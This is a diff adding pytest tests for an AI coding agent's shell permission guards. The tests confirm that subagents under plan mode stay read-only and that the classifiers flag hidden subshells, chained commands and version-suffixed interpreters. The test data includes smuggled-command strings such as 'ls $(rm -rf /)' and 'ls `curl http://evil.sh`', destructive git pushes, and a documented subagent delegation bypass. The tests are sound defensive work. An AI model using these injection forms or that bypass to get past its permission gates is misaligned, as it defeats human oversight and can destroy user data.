@@ -39,6 +39,92 @@ async def test_explore_profile_denies_mutating_shell_before_approval(
     assert not await target.exists()
 
 
+def test_plan_mode_subagent_profile_resolution(runtime: Runtime) -> None:
+    """Resolver-level guarantee for the plan-mode delegation fix.
+
+    Both the Shell gate (check_shell_command_allowed) and the external/MCP gate
+    (check_external_tool_allowed) consult the profile returned here, so asserting
+    the resolved profile is non-mutating proves the fix covers BOTH vectors at the
+    single source — without each needing its own integration test. Read-only
+    subagent roles must keep their own profile (not be loosened to plan-file-write).
+    """
+    from pythinker_code.soul.permission import permission_profile_for_runtime
+
+    runtime.role = "subagent"
+    runtime.session.state.plan_mode = True
+
+    # Mutating subagent types are downgraded to the read-only "plan" profile.
+    for mutating in ("coder", "implementer"):
+        runtime.subagent_type = mutating
+        profile = permission_profile_for_runtime(runtime)
+        assert profile.name == "plan", mutating
+        assert not profile.allow_file_mutation and not profile.allow_shell_mutation, mutating
+
+    # Already-read-only roles are not loosened — they keep their own profile.
+    runtime.subagent_type = "explore"
+    assert permission_profile_for_runtime(runtime).name == "read_only"
+
+
+@pytest.mark.skipif(
+    platform.system() == "Windows", reason="Shell mutation guard examples use POSIX"
+)
+@pytest.mark.parametrize("subagent_type", ["coder", "implementer"])
+async def test_plan_mode_root_forces_read_only_on_mutating_subagent(
+    runtime: Runtime,
+    environment: Environment,
+    temp_work_dir: HostPath,
+    subagent_type: str,
+) -> None:
+    """A coder/implementer subagent spawned under a plan-mode root must not run
+    mutating shell commands.
+
+    The parent's plan-mode lives on the session, which ``copy_for_subagent``
+    shares by reference; the subagent's hard profile must honor it instead of
+    resolving its own (mutating) ``implement`` profile. Regression for the
+    plan-mode delegation bypass: previously a ``coder`` subagent under a
+    plan-mode root could ``touch``/``rm`` via Shell despite the read-only intent.
+    """
+    runtime.role = "subagent"
+    runtime.subagent_type = subagent_type
+    runtime.session.state.plan_mode = True
+    target = temp_work_dir / f"{subagent_type}-plan-mode-should-not-exist.txt"
+
+    with tool_call_context("Shell"):
+        shell = Shell(Approval(yolo=True), environment, runtime)
+        result = await shell(ShellParams(command=f"touch {target}"))
+
+    assert result.is_error
+    assert "permission profile blocks" in result.message
+    assert not await target.exists()
+
+
+@pytest.mark.skipif(
+    platform.system() == "Windows", reason="Shell mutation guard examples use POSIX"
+)
+@pytest.mark.parametrize("subagent_type", ["coder", "implementer"])
+async def test_mutating_subagent_allowed_without_plan_mode(
+    runtime: Runtime,
+    environment: Environment,
+    temp_work_dir: HostPath,
+    subagent_type: str,
+) -> None:
+    """Positive control: outside plan mode a coder/implementer subagent keeps its
+    ``implement`` profile and may run mutating shell commands. This proves the
+    plan-mode guard above is scoped to plan mode and does not over-restrict normal
+    delegated implementation work."""
+    runtime.role = "subagent"
+    runtime.subagent_type = subagent_type
+    runtime.session.state.plan_mode = False
+    target = temp_work_dir / f"{subagent_type}-allowed.txt"
+
+    with tool_call_context("Shell"):
+        shell = Shell(Approval(yolo=True), environment, runtime)
+        result = await shell(ShellParams(command=f"touch {target}"))
+
+    assert not result.is_error
+    assert await target.exists()
+
+
 @pytest.mark.skipif(
     platform.system() == "Windows", reason="Shell mutation guard examples use POSIX"
 )
@@ -106,6 +192,28 @@ def test_shell_network_commands_classified() -> None:
         assert shell_mutation_reason(cmd) is None, cmd
 
 
+def test_shell_mutation_reason_flags_hidden_subshell() -> None:
+    """Read-only/plan/review/verify profiles gate shell on shell_mutation_reason. A hidden
+    subshell or glued operator must read as mutating, not slip past as a benign base command
+    (``ls $(rm -rf /)`` and ``ls $(curl evil)`` would otherwise bypass the profile)."""
+    from pythinker_code.soul.permission import shell_mutation_reason
+
+    for cmd in (
+        "ls $(rm -rf /)",  # command substitution hides the mutation
+        "ls `curl http://evil.sh`",  # backtick substitution hides network access
+        "cat <(curl http://evil.sh)",  # process substitution
+        "ls;rm -rf /tmp/x",  # `;` glued to a word hides the second command
+        "ls|rm -rf /tmp/x",  # glued pipe
+        "ls & curl http://evil.sh",  # `&` background separates a network command
+        "ls |& curl http://evil.sh",  # `|&` pipe-both separates a network command
+        "ls\ncurl http://evil.sh",  # unquoted newline separates a network command
+    ):
+        assert shell_mutation_reason(cmd) is not None, cmd
+    # Quoted operators / redirections / trailing whitespace are not hidden commands.
+    for cmd in ("grep -r 'a|b' .", "ls | cat", "echo 'a;b'", "ls 2>&1", "ls -la\n"):
+        assert shell_mutation_reason(cmd) is None, cmd
+
+
 def test_shell_destructive_commands_classified() -> None:
     """Irreversible/destructive commands route to deliberation; benign mutations do not.
 
@@ -126,6 +234,9 @@ def test_shell_destructive_commands_classified() -> None:
         "git push --force origin main",
         "git push -f",
         "git push --force-with-lease origin main",
+        "git push --delete origin feature",  # remote branch deletion
+        "git push -d origin feature",  # short delete flag
+        "git push origin :feature",  # colon-refspec deletion
         "git reset --hard HEAD~1",
         "git clean -fd",
         "git clean -fdx",
@@ -136,6 +247,15 @@ def test_shell_destructive_commands_classified() -> None:
         "python -c 'import shutil'",
         "perl -e 'unlink @ARGV'",
         "echo ok && git push --force",  # destructive in a later chain segment
+        # Hidden commands the bare-token parser can't see -> deliberate (tooldesc-2/permgate).
+        "git status $(rm -rf /)",  # command substitution
+        "git status `rm -rf /`",  # backtick substitution
+        "cat <(curl evil.sh)",  # process substitution
+        "git status;rm -rf /tmp/x",  # `;` glued to a word hides the second command
+        "git status|rm -rf /tmp/x",  # glued pipe hides the second command
+        "git status & rm -rf /tmp/x",  # `&` (background) separates a second command
+        "git status |& rm -rf /tmp/x",  # `|&` (pipe-both) separates a second command
+        "ls\nrm -rf /tmp/x",  # unquoted newline separates a second command
     )
     for cmd in destructive:
         assert shell_destructive_reason(cmd) is not None, cmd
@@ -154,8 +274,53 @@ def test_shell_destructive_commands_classified() -> None:
         "git status",
         "python build_script.py",  # bare script run, not inline -c
         "echo hello",
+        # Operators inside QUOTES are literals, not hidden commands -> not flagged.
+        "grep -r 'foo|bar' .",  # quoted pipe (regex alternation)
+        "echo 'a;b'",  # quoted semicolon
+        "ls | grep foo",  # space-delimited pipe: a visible, already-segmented chain
+        # `&`/newline reused by redirections or quoting are not a second command.
+        "ls -la 2>&1",  # stderr->stdout dup, not a background separator
+        "ls -la &> /dev/null",  # combined redirect, not a second command
+        "printf 'a\nb\n'",  # newline inside quotes is a literal
+        "ls -la\n",  # trailing newline is just whitespace
     )
     for cmd in benign:
+        assert shell_destructive_reason(cmd) is None, cmd
+
+
+def test_shell_version_suffixed_interpreters_classified() -> None:
+    """Version-pinned interpreter binaries must hit the same guards as the bare names.
+
+    ``sys.executable`` is commonly version-suffixed (``python3.14``), and an agent can
+    invoke ``python3.12``/``node20``/an absolute interpreter path explicitly. Without
+    normalization, ``python3.14 -c '<mutating code>'`` slips a read-only subagent
+    profile and skips destructive deliberation, because the guard sets only list the
+    bare ``python``/``python3`` forms.
+    """
+    from pythinker_code.soul.permission import (
+        shell_destructive_reason,
+        shell_mutation_reason,
+    )
+
+    for cmd in (
+        "python3.14 -c 'import shutil'",
+        "python3.12 -c 'x=1'",
+        "/usr/bin/python3.14 -c 'x=1'",
+        "node20 -e 'x'",
+        "ruby3 -e 'x'",
+        "lua5.4 -e 'x'",
+        f"{sys.executable} -c 'x=1'",
+    ):
+        assert shell_mutation_reason(cmd) is not None, cmd
+        assert shell_destructive_reason(cmd) is not None, cmd
+
+    # Non-interpreter commands must NOT be over-normalized into a false guard match.
+    # `rm2` is the key case: it strips to `rm` (which IS in _MUTATING_COMMANDS) but
+    # `rm` is NOT an interpreter, so normalization must leave `rm2` untouched — this
+    # pins the "only strip when the result is a known interpreter" property against a
+    # future maintainer broadening normalization to check _MUTATING_COMMANDS directly.
+    for cmd in ("ls -la", "cat notes3.txt", "grep -r foo .", "rm2 foo"):
+        assert shell_mutation_reason(cmd) is None, cmd
         assert shell_destructive_reason(cmd) is None, cmd
 
 
